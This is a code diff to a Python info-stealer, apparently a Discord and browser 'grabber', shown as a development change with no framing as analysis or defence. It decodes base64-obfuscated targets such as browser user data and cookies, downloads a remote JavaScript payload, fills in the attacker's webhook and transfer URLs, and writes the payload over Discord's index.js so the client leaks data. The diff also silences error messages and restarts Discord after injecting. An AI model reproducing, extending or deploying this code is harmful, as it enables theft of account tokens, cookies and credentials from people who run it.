@@ -49,7 +49,7 @@ stspecial = "Team"
 maybycool = base64.b64decode(b'VXNlciBEYXRh').decode()
 grbber = base64.b64decode(b'R3JhYmJlcg==').decode()
 ntwrk = base64.b64decode(b'TmV0d29yaw==').decode()
-justafcklink = base64.b64decode(b'TmV0d29yaw==').decode()
+justafcklink = base64.b64decode(b'SW5qZWN0aW9uL21haW4vaW5kZXguanM=').decode()
 myname_little = hwkish.lower()
 justaterm = base64.b64decode(b'Q29va2llcw==').decode()
 justatermlil = justaterm.lower()
@@ -739,7 +739,7 @@ class hwkish_first_funct(Functions):
             }
 
         self.path_shortcutnav_roaming = {
-            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -754,7 +754,7 @@ class hwkish_first_funct(Functions):
             "Opera Neon": f"{self.roaming}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera Neon.lnk"
         }
         self.path_shortcutnav_programdata = {
-            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
+            "Google Chrome": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Google Chrome.lnk",
             "Opera": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera.lnk",
             "Opera GX": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Opera GX.lnk",
             "Brave": f"{self.programdata}\\Microsoft\\Windows\\Start Menu\\Programs\\Brave.lnk",
@@ -1119,7 +1119,7 @@ class hwkish_first_funct(Functions):
         self.ping_on_running()
         self.finished_bc()
         await self.injection_discord()
-        await self.soundlilvoice()
+        self.soundlilvoice()
         
     def kill_process(self, process_name):
         for proc in psutil.process_iter():
@@ -1412,23 +1412,25 @@ class hwkish_first_funct(Functions):
                             pass
                     if self.webapi_find in self.thishawk_webh:
                         core_asar = self.find_in_config("url_hawkinject")
+                        print(core_asar)
                         try:
                             f = httpx.get(core_asar).text
                             if self.apilink != "%API_"+ "LINK%" and self.apilink != "" and self.apilink != " ":
                                 f = f.replace("%API_URL%", self.apilink)
                                 f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                 f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
+                                f = f.replace("\n\n", "\n")
                             else:
                                 f = f.replace("%WEBHOOK%", self.thishawk_webh)
                                 f = f.replace("%NAME_CREATOR%", self.str_creator_)
                                 f = f.replace("%TRANSFER_URL%", self.thezip_url.replace("\n", ""))
+                                f = f.replace("\n\n", "\n")
                         except AttributeError:
                             pass
                     try:
-                        with open(
-                            idx_path, "w", errors="ignore"
-                            ) as indexdiscfile:
-                            indexdiscfile.write(f)
+                        with open(idx_path, "w", errors="ignore", newline="") as indexdiscfile:
+                            print(f)
+                            indexdiscfile.write(f.rstrip('\r\n'))
                     except PermissionError:
                         pass
                 
@@ -1441,11 +1443,26 @@ class hwkish_first_funct(Functions):
                         try:
                             subprocess.run(cmd, check=True)
                         except subprocess.CalledProcessError as e:
-                            print(f"Error starting the application: {e}")
+                            pass
                         except FileNotFoundError as e:
-                            print(f"Application file not found: {e}")
-                        except Exception as e:
-                            print(f"An error occurred: {e}")
+                            pass
+                        except Exception as e:               
+                            pass
+                
+                    if self.find_in_config("killdiscord_config"):
+                        file_name = os.path.splitext(os.path.basename(discord_path))[0]
+                        app_exe = os.path.join(app_path, file_name + ".exe")
+                        if not os.path.isabs(app_exe):
+                            raise ValueError(f"Invalid path: {app_exe}")
+                        cmd = [app_exe]
+                        try:
+                            subprocess.run(cmd, check=True)
+                        except subprocess.CalledProcessError as e:
+                            pass
+                        except FileNotFoundError as e:
+                            pass
+                        except Exception as e:               
+                            pass
 
     def soundlilvoice(self):
         if self.soundedornot != 'yes':
